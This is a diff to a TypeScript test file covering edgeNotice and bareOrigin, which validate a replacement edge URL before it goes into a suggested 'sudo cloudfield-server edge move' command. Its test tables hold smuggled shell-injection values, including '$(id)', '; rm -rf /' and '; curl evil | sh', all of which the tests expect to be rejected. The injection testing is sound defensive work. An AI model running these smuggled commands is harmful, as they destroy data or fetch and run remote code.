@@ -1,6 +1,6 @@
-import { deviceNeeds, needsYou, needsYouConditions, waitingOn, type AttentionState, type NeedsYouID } from '@/lib/needs-you'
+import { bareOrigin, deviceNeeds, edgeNotice, needsYou, needsYouConditions, waitingOn, type AttentionState, type NeedsYouID } from '@/lib/needs-you'
 import { groupOf, presentRun } from '@/lib/status'
-import type { Run } from '@/lib/types'
+import type { Run, ServerEdge } from '@/lib/types'
 import { toRecord, type RunRecord } from '@/store/runs'
 import {
   alice,
@@ -462,5 +462,96 @@ describe('device cards', () => {
       admits: 'admits as: Bob (collaborator)',
       waitingSince: device.created_at,
     }])
+  })
+})
+
+describe('edgeNotice', () => {
+  const edge: ServerEdge = {
+    edge_url: 'https://edge-old.example.test', server_id: 'wqc4lsjvzdzrwq3k5dabdtajwj', access_policy: 'approved-devices',
+    owner: null, connected: true, claimed: true,
+  }
+  const replacement = 'https://edge-new.example.test'
+  const move = `sudo cloudfield-server edge move ${replacement}`
+  const restart = 'sudo systemctl restart aether-server'
+
+  it('is nothing without a notice or an edge', () => {
+    expect(edgeNotice(null)).toBeUndefined()
+    expect(edgeNotice(edge)).toBeUndefined()
+    expect(edgeNotice({ ...edge, edge_url: '', notice: { state: 'retiring', replacement } })).toBeUndefined()
+  })
+
+  it.each([
+    [{ state: 'retiring', replacement } as const, 'https://edge-old.example.test is retiring'],
+    [{ state: 'retiring', replacement, date: '2027-03-01' } as const, 'https://edge-old.example.test is retiring on 2027-03-01'],
+    [{ state: 'retired', replacement } as const, 'https://edge-old.example.test is retired'],
+    [{ state: 'retiring', replacement, first_use: true } as const, 'https://edge-old.example.test is retiring'],
+  ])('says what %o means and how to move', (notice, reason) => {
+    expect(edgeNotice({ ...edge, notice })).toEqual({ notice, edgeURL: edge.edge_url, state: notice.state, reason, noticeReason: reason, move, restart })
+  })
+})
+
+describe('bareOrigin', () => {
+  it.each([
+    ['https://edge.example.test', true],
+    ['https://edge.example.test:8443', true],
+    ['https://edge.example.test:443', true],
+    ['https://192.0.2.1', true],
+    ['https://[2001:db8::1]:8443', true],
+    ['https://[::ffff:192.0.2.1]', true],
+    ['https://[::]', true],
+    ['https://[2001:db8:0:0:0:0:0:1]', true],
+    [`https://${'a'.repeat(63)}.example.test`, true],
+    ['https://[:::1]', false],
+    ['https://[1:2]', false],
+    ['https://[1::2::3]', false],
+    ['https://[2001:db8:0:0:0:0:0:0:1]', false],
+    ['https://[2001:DB8::1]', false],
+    ['https://[fe80::1%eth0]', false],
+    ['https://[::ffff:192.0.2.01]', false],
+    [`https://${'a'.repeat(64)}.example.test`, false],
+    [`https://${Array(64).fill('abc').join('.')}`, false],
+    ['https://-edge.example.test', false],
+    ['https://edge..example.test', false],
+    ['https://edge.example.test:00080', false],
+    ['https://edge.example.test:0', false],
+    ['https://edge.example.test:65536', false],
+    ['https://edge.example.test:123456', false],
+    ['https://edge.example.test/', false],
+    ['https://edge.example.test/path', false],
+    ['https://edge.example.test?x=1', false],
+    ['https://user@edge.example.test', false],
+    ['http://edge.example.test', false],
+    ['https://edge;notice.example', false],
+    ['https://edge.example.test;id', false],
+    ['https://$(id).example.test', false],
+    ['https://edge`id`.example.test', false],
+    ['https://edge.example.test|sh', false],
+    ['https://edge.example.test&', false],
+    ['https://edge.example.test; rm -rf /', false],
+    ['https://edge.example.test\n', false],
+    ['https://edge.example.test\t', false],
+    ['https://EDGE.example.test', false],
+    ['https://-edge.example.test', false],
+    ['https://[2001:db8::1;id]', false],
+    ['x', false],
+  ])('%s: %s', (value, want) => {
+    expect(bareOrigin(value)).toBe(want)
+  })
+
+  it('quotes an IPv6 replacement, whose brackets a shell would glob', () => {
+    const need = edgeNotice({
+      edge_url: 'https://edge-old.example.test', server_id: 'wqc4lsjvzdzrwq3k5dabdtajwj', access_policy: 'approved-devices',
+      owner: null, connected: true, claimed: true, notice: { state: 'retiring', replacement: 'https://[2001:db8::1]:8443' },
+    })
+    expect(need?.move).toBe("sudo cloudfield-server edge move 'https://[2001:db8::1]:8443'")
+  })
+
+  it('gives no command for a replacement that is not one', () => {
+    const need = edgeNotice({
+      edge_url: 'https://edge-old.example.test', server_id: 'wqc4lsjvzdzrwq3k5dabdtajwj', access_policy: 'approved-devices',
+      owner: null, connected: true, claimed: true, notice: { state: 'retiring', replacement: 'https://x.example.test; curl evil | sh' },
+    })
+    expect(need?.move).toBeUndefined()
+    expect(need?.reason).toBe('https://edge-old.example.test is retiring')
   })
 })
